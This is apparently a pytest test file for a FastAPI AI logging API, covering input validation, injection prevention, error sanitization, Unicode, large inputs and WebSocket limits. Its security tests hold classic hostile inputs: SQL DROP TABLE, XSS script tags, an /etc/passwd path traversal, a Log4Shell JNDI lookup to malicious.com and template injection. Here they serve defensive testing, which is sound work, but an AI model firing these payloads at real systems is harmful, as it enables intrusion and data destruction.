"""
Security and validation tests for AI Logging API
Tests input validation, security boundaries, and error handling
"""

import pytest
import json
from datetime import datetime
from unittest.mock import Mock, AsyncMock, patch
from fastapi.testclient import TestClient
from fastapi import status

from src.api.models.ai_logs import QueryMode, SeverityLevel, ExportFormat


class TestAILogsInputValidation:
    """Test comprehensive input validation for all endpoints"""
    
    @pytest.mark.asyncio
    async def test_query_model_validation(self):
        """Test Pydantic model validation for query parameters"""
        from src.main import app
        
        with TestClient(app) as client:
            # Test invalid time_range format
            response = client.get("/api/v1/ai_logs/query?time_range=invalid_format")
            assert response.status_code == 422
            error_detail = response.json()["detail"]
            assert any("time_range" in str(err) for err in error_detail)
            
            # Test invalid mode enum
            response = client.get("/api/v1/ai_logs/query?mode=invalid_mode")
            assert response.status_code == 422
            
            # Test negative limit
            response = client.get("/api/v1/ai_logs/query?limit=-1")
            assert response.status_code == 422
            
            # Test excessive limit
            response = client.get("/api/v1/ai_logs/query?limit=10001")
            assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_correlation_request_validation(self):
        """Test correlation endpoint request validation"""
        from src.main import app
        
        with TestClient(app) as client:
            # Test empty correlation_id
            response = client.post("/api/v1/ai_logs/correlate", 
                                 json={"correlation_id": ""})
            assert response.status_code == 422
            
            # Test missing correlation_id
            response = client.post("/api/v1/ai_logs/correlate", json={})
            assert response.status_code == 422
            
            # Test null correlation_id
            response = client.post("/api/v1/ai_logs/correlate", 
                                 json={"correlation_id": None})
            assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_pattern_request_validation(self):
        """Test pattern detection request validation"""
        from src.main import app
        
        with TestClient(app) as client:
            # Test invalid time_range in pattern request
            response = client.post("/api/v1/ai_logs/patterns", 
                                 json={"time_range": "invalid", "services": ["api"]})
            assert response.status_code == 422
            
            # Test invalid confidence value
            response = client.post("/api/v1/ai_logs/patterns", 
                                 json={"time_range": "1h", "min_confidence": 1.5})
            assert response.status_code == 422
            
            # Test negative confidence
            response = client.post("/api/v1/ai_logs/patterns", 
                                 json={"time_range": "1h", "min_confidence": -0.1})
            assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_export_request_validation(self):
        """Test export endpoint request validation"""
        from src.main import app
        
        with TestClient(app) as client:
            # Test invalid export format
            response = client.post("/api/v1/ai_logs/export", 
                                 json={"format": "invalid_format", "time_range": "1h"})
            assert response.status_code == 422
            
            # Test invalid time range in export
            response = client.post("/api/v1/ai_logs/export", 
                                 json={"format": "json", "time_range": "invalid"})
            assert response.status_code == 422


class TestAILogsSecurity:
    """Test security boundaries and injection prevention"""
    
    @pytest.mark.asyncio
    async def test_correlation_id_injection_prevention(self):
        """Test prevention of injection attacks via correlation_id"""
        from src.main import app
        
        injection_payloads = [
            "'; DROP TABLE logs; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com}",
            "{{7*7}}",  # Template injection
            "\x00\x01\x02",  # Binary data
        ]
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.return_value = {"logs": [], "total_count": 0}
            
            with TestClient(app) as client:
                for payload in injection_payloads:
                    response = client.get(f"/api/v1/ai_logs/query?correlation_id={payload}")
                    
                    # Should either reject (422) or sanitize the input
                    assert response.status_code in [200, 422]
                    
                    if response.status_code == 200:
                        # Verify the payload was sanitized/escaped in processor call
                        call_args = mock_proc.process_query.call_args
                        query_params = call_args[1]['query_params']
                        
                        # Correlation ID should not contain raw injection payload
                        correlation_id = query_params.get('correlation_id', '')
                        assert payload != correlation_id or len(correlation_id) == 0
    
    @pytest.mark.asyncio
    async def test_service_filter_injection_prevention(self):
        """Test prevention of injection in service filters"""
        from src.main import app
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.return_value = {"logs": [], "total_count": 0}
            
            with TestClient(app) as client:
                # Test SQL injection in services parameter
                response = client.get("/api/v1/ai_logs/query?services=api'; DROP TABLE logs; --")
                assert response.status_code in [200, 422]
                
                # Test XSS in services parameter
                response = client.get("/api/v1/ai_logs/query?services=<script>alert('xss')</script>")
                assert response.status_code in [200, 422]
    
    @pytest.mark.asyncio
    async def test_response_sanitization(self):
        """Test that responses are properly sanitized"""
        from src.main import app
        
        malicious_log_entry = {
            "timestamp": "2025-06-30T10:00:00Z",
            "level": "INFO",
            "message": "<script>alert('xss')</script>",
            "correlation_id": "'; DROP TABLE logs; --",
            "service": "api"
        }
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.return_value = {
                "logs": [malicious_log_entry],
                "total_count": 1,
                "query_time_ms": 10
            }
            
            with TestClient(app) as client:
                response = client.get("/api/v1/ai_logs/query")
                assert response.status_code == 200
                
                response_data = response.json()
                
                # Verify response is JSON (not executable)
                assert response.headers.get("content-type") == "application/json"
                
                # Verify no script tags in response
                response_text = response.text
                assert "<script>" not in response_text
                assert "DROP TABLE" not in response_text
    
    @pytest.mark.asyncio
    async def test_error_message_sanitization(self):
        """Test that error messages don't expose sensitive information"""
        from src.main import app
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            # Simulate error with sensitive information
            mock_proc.process_query.side_effect = Exception(
                "Database error: connection failed to postgresql://user:password@localhost:5432/db"
            )
            
            with TestClient(app) as client:
                response = client.get("/api/v1/ai_logs/query")
                assert response.status_code == 500
                
                error_response = response.json()
                error_message = str(error_response)
                
                # Should not expose database credentials
                assert "password" not in error_message.lower()
                assert "postgresql://" not in error_message
                assert "localhost:5432" not in error_message


class TestAILogsAdvancedEdgeCases:
    """Test advanced edge cases and boundary conditions"""
    
    @pytest.mark.asyncio
    async def test_unicode_handling(self):
        """Test handling of Unicode characters in various fields"""
        from src.main import app
        
        unicode_test_cases = [
            "测试-correlation-id",  # Chinese characters
            "тест-корреляция",      # Cyrillic
            "🔥-fire-emoji-🚀",     # Emojis
            "café-résumé-naïve",    # Accented characters
            "\\u0000\\u001f",       # Control characters
        ]
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.return_value = {"logs": [], "total_count": 0}
            
            with TestClient(app) as client:
                for test_case in unicode_test_cases:
                    response = client.get(f"/api/v1/ai_logs/query?correlation_id={test_case}")
                    
                    # Should handle Unicode gracefully
                    assert response.status_code in [200, 422]
                    
                    if response.status_code == 200:
                        # Response should be valid JSON
                        response_data = response.json()
                        assert isinstance(response_data, dict)
    
    @pytest.mark.asyncio
    async def test_extremely_large_requests(self):
        """Test handling of very large request payloads"""
        from src.main import app
        
        with TestClient(app) as client:
            # Test very long correlation ID
            long_correlation_id = "x" * 10000
            response = client.get(f"/api/v1/ai_logs/query?correlation_id={long_correlation_id}")
            
            # Should reject or truncate very long inputs
            assert response.status_code in [200, 422, 413]  # 413 = Payload Too Large
            
            # Test large service list
            large_service_list = ",".join([f"service-{i}" for i in range(1000)])
            response = client.get(f"/api/v1/ai_logs/query?services={large_service_list}")
            assert response.status_code in [200, 422, 413]
    
    @pytest.mark.asyncio
    async def test_concurrent_websocket_connections(self):
        """Test multiple WebSocket connections simultaneously"""
        from src.main import app
        
        max_connections = 10
        connections = []
        
        try:
            with TestClient(app) as client:
                # Try to open multiple WebSocket connections
                for i in range(max_connections):
                    try:
                        ws = client.websocket_connect("/api/v1/ai_logs/stream")
                        connections.append(ws)
                        
                        # Send initial message
                        ws.send_json({
                            "action": "subscribe",
                            "filter": {"services": [f"service-{i}"]}
                        })
                        
                    except Exception as e:
                        # Some connections may be rejected due to limits
                        break
                
                # Should handle at least a few connections
                assert len(connections) > 0
                
                # Test that existing connections still work
                for ws in connections[:3]:  # Test first 3 connections
                    try:
                        ws.send_json({"action": "ping"})
                        # Should not raise exception
                    except Exception:
                        # Connection may have been dropped
                        pass
                        
        finally:
            # Clean up all connections
            for ws in connections:
                try:
                    ws.close()
                except:
                    pass
    
    @pytest.mark.asyncio
    async def test_malformed_json_requests(self):
        """Test handling of malformed JSON in request bodies"""
        from src.main import app
        
        malformed_payloads = [
            '{"correlation_id": "test"',  # Missing closing brace
            '{"correlation_id": }',        # Missing value
            '{"correlation_id": "test",}', # Trailing comma
            '{correlation_id: "test"}',    # Unquoted key
            'not json at all',             # Not JSON
            '{"correlation_id": "test"} extra',  # Extra content
        ]
        
        with TestClient(app) as client:
            for payload in malformed_payloads:
                response = client.post(
                    "/api/v1/ai_logs/correlate",
                    content=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                # Should reject malformed JSON
                assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_timezone_handling(self):
        """Test handling of various timezone formats"""
        from src.main import app
        
        timezone_test_cases = [
            "2025-06-30T10:00:00Z",           # UTC
            "2025-06-30T10:00:00+00:00",      # UTC with offset
            "2025-06-30T15:00:00+05:00",      # Positive offset
            "2025-06-30T05:00:00-05:00",      # Negative offset
            "2025-06-30T10:00:00.123Z",       # With milliseconds
            "2025-06-30T10:00:00",            # No timezone (local)
        ]
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.return_value = {"logs": [], "total_count": 0}
            
            with TestClient(app) as client:
                for timestamp in timezone_test_cases:
                    # Test in start_time parameter if available
                    response = client.get(f"/api/v1/ai_logs/query?start_time={timestamp}")
                    
                    # Should handle timezone formats gracefully
                    assert response.status_code in [200, 422]


class TestAILogsErrorPropagation:
    """Test error propagation and handling across service boundaries"""
    
    @pytest.mark.asyncio
    async def test_loki_connection_failure_handling(self):
        """Test handling of Loki service connection failures"""
        from src.main import app
        
        connection_errors = [
            ConnectionRefusedError("Connection refused"),
            TimeoutError("Request timeout"),
            OSError("Network is unreachable"),
        ]
        
        for error in connection_errors:
            with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
                mock_proc.process_query.side_effect = error
                
                with TestClient(app) as client:
                    response = client.get("/api/v1/ai_logs/query")
                    
                    # Should return service unavailable
                    assert response.status_code == 503
                    
                    error_response = response.json()
                    assert "service unavailable" in error_response["detail"].lower()
    
    @pytest.mark.asyncio
    async def test_partial_service_failure(self):
        """Test handling when some services are unavailable"""
        from src.main import app
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            # Simulate partial failure - some logs returned with warnings
            mock_proc.process_query.return_value = {
                "logs": [{"service": "api", "message": "Available service log"}],
                "total_count": 1,
                "query_time_ms": 100,
                "warnings": ["Service 'anythingllm' unavailable"],
                "partial_results": True
            }
            
            with TestClient(app) as client:
                response = client.get("/api/v1/ai_logs/query?services=api,anythingllm")
                
                # Should succeed but indicate partial results
                assert response.status_code == 200
                
                response_data = response.json()
                assert response_data.get("partial_results") is True
                assert len(response_data.get("warnings", [])) > 0
    
    @pytest.mark.asyncio
    async def test_correlation_id_propagation(self):
        """Test that correlation IDs are properly propagated through errors"""
        from src.main import app
        
        test_correlation_id = "test-error-propagation-123"
        
        with patch('src.api.v1.ai_logs_endpoints.processor') as mock_proc:
            mock_proc.process_query.side_effect = Exception("Test error")
            
            with TestClient(app) as client:
                response = client.get(f"/api/v1/ai_logs/query?correlation_id={test_correlation_id}")
                
                assert response.status_code == 500
                
                # Check if correlation ID is preserved in error context
                # (This would depend on error logging implementation)
                error_response = response.json()
                
                # Verify error response structure
                assert "detail" in error_response
                assert isinstance(error_response["detail"], str)


# Run tests with pytest
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])